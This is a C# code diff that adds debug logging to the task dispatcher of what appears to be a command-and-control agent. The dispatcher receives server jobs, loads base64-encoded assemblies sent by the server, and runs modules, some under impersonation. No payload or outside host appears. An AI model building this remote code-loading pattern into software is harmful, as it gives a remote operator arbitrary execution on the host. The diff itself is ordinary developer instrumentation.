@@ -23,6 +23,7 @@ namespace Workflow.Providers
 
         public async Task StartTaskAsync(ServerJob job)
         {
+            DebugLog.Log($"Task received: {job.task.command} [{job.task.id}]");
             this.messageManager.AddJob(job);
             TaskResponse rr = new TaskResponse()
             {
@@ -39,8 +40,10 @@ namespace Workflow.Providers
                         byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
                         if (buf.Length > 0)
                         {
+                            DebugLog.Log($"Loading module: {loadCommand.command}");
                             if(this.assemblyManager.LoadModuleAsync(job.task.id, loadCommand.command, buf))
                             {
+                                DebugLog.Log($"Module loaded: {loadCommand.command}");
                                 LoadTaskResponse cr = new LoadTaskResponse()
                                 {
                                     completed = true,
@@ -59,6 +62,7 @@ namespace Workflow.Providers
                             }
                             else
                             {
+                                DebugLog.Log($"Failed to load module: {loadCommand.command}");
                                 LoadTaskResponse cr = new LoadTaskResponse()
                                 {
                                     completed = true,
@@ -72,6 +76,7 @@ namespace Workflow.Providers
                     }
                     break;
                 case "load-assembly":
+                    DebugLog.Log($"Loading assembly [{job.task.id}]");
                     LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                     if (command is not null)
                     {
@@ -83,10 +88,12 @@ namespace Workflow.Providers
                     }
                     break;
                 default:
+                    DebugLog.Log($"Executing module: {job.task.command} [{job.task.id}]");
                     _ = Task.Run(async () =>
                     {
                         if (!this.assemblyManager.TryGetModule(job.task.command, out IModule plug))
                         {
+                            DebugLog.Log($"Module not found: {job.task.command}");
                             this.messageManager.AddTaskResponse(new TaskResponse()
                             {
                                 task_id = job.task.id,
@@ -105,6 +112,7 @@ namespace Workflow.Providers
                             }
                             catch (Exception e)
                             {
+                                DebugLog.Log($"Task execution error: {job.task.command} [{job.task.id}]: {e.Message}");
                                 this.messageManager.AddTaskResponse(new TaskResponse()
                                 {
                                     task_id = job.task.id,
@@ -122,6 +130,7 @@ namespace Workflow.Providers
                         }
                         catch (Exception e)
                         {
+                            DebugLog.Log($"Impersonated task error: {job.task.command} [{job.task.id}]: {e.Message}");
                             this.messageManager.AddTaskResponse(new TaskResponse()
                             {
                                 task_id = job.task.id,
@@ -138,6 +147,7 @@ namespace Workflow.Providers
         }
         public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
         {
+            DebugLog.Log($"HandleServerResponses: {responses.Count} response(s)");
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
@@ -176,6 +186,7 @@ namespace Workflow.Providers
         }
         public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
         {
+            DebugLog.Log($"HandleProxyResponses: type={type}, count={responses?.Count ?? 0}");
             List<Task> tasks = new List<Task>();
             if (!this.assemblyManager.TryGetModule<IProxyModule>(type, out var plugin))
             {
@@ -202,6 +213,7 @@ namespace Workflow.Providers
         }
         public async Task HandleDelegateResponses(List<DelegateMessage> responses)
         {
+            DebugLog.Log($"HandleDelegateResponses: {responses.Count} delegate(s)");
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
@@ -225,6 +237,7 @@ namespace Workflow.Providers
         }
         public async Task HandleInteractiveResponses(List<InteractMessage> responses)
         {
+            DebugLog.Log($"HandleInteractiveResponses: {responses.Count} message(s)");
             List<Task> tasks = new List<Task>();
             foreach(var response in responses)
             {
